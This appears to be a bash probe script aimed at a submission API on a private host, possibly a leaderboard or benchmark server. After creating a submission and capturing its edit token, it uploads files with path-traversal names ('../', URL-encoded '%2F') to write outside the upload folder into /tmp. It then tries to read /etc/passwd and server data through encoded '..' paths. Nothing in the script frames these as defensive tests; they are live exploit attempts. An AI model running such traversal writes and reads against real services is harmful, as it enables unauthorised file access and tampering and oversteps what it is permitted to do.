#!/bin/bash
set +e
D=/dev/shm/ul5685/wr; mkdir -p $D
B=http://192.168.0.24:18086
echo "=== create submission"
R=$(timeout 10 curl -s -m 8 -X POST -H 'Content-Type: application/json' -d '{"model":"ulw5685","nickname":"ul-t2-123-184-7-135","description":"writeprobe","contexts":["H"]}' "$B/api/submissions")
echo "$R" | head -c 400; echo
SID=$(echo "$R" | python3 -c 'import sys,json;print(json.load(sys.stdin)["id"])')
TOK=$(echo "$R" | python3 -c 'import sys,json;print(json.load(sys.stdin)["edit_token"])')
echo "SID=$SID TOK=${TOK:0:12}..."

put() { # ctx filename bodylabel content
  local ctx="$1" fn="$2" tag="$3" body="$4"
  printf '%s' "$body" > $D/body_$tag
  echo "-- PUT ctx=$ctx fn=$fn"
  timeout 15 curl -s -m 12 -X PUT -H "X-Edit-Token: $TOK" -H "X-Filename: $(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))" "$fn")" -H 'Content-Type: application/octet-stream' --data-binary @$D/body_$tag "$B/api/submissions/$SID/files/$ctx" -w "\n  HTTP %{http_code}\n" | head -c 600; echo
}

put H ul_a.txt a "MARKER_A_5685"
put H ../ul_b.txt b "MARKER_B_5685"
put H ../../ul_c.txt c "MARKER_C_5685"
put H ../../../../../../../../tmp/ul5685_tmp.txt t "MARKER_T_5685"
put "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Ftmp" ul5685_ctx.txt ct "MARKER_CTX_5685"
echo "=== sub state after puts"
timeout 10 curl -s -m 8 "$B/api/submissions/$SID" | head -c 1200; echo
echo "=== readback attempts via /downloads"
for p in "/downloads/../server_data/" "/downloads/../../../../etc/passwd" "/downloads/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd" "/downloads/../../../etc/passwd" "/downloads/submit.py" "/downloads/H/genes.csv"; do
  echo "-- GET $p"; timeout 8 curl -s -m 6 --path-as-is "$B$p" -o $D/rb -w "  HTTP %{http_code} len=%{size_download}\n"; head -c 160 $D/rb | tr -d '\000'; echo
done
echo "=== static file route guesses"
for p in "/files/ul_a.txt" "/server_data/" "/submissions/$SID/" "/data/" "/api/files" ; do
  echo "-- GET $p"; timeout 6 curl -s -m 5 "$B$p" -o $D/rb2 -w "  HTTP %{http_code} len=%{size_download}\n"; head -c 120 $D/rb2; echo
done
echo "=== commit"
timeout 20 curl -s -m 18 -X POST -H "X-Edit-Token: $TOK" -H 'Content-Type: application/json' -d '{}' "$B/api/submissions/$SID/commit" -w "\n  HTTP %{http_code}\n" | head -c 800; echo
sleep 3
echo "=== state after commit"
timeout 10 curl -s -m 8 "$B/api/submissions/$SID" | head -c 2500; echo
echo DONE
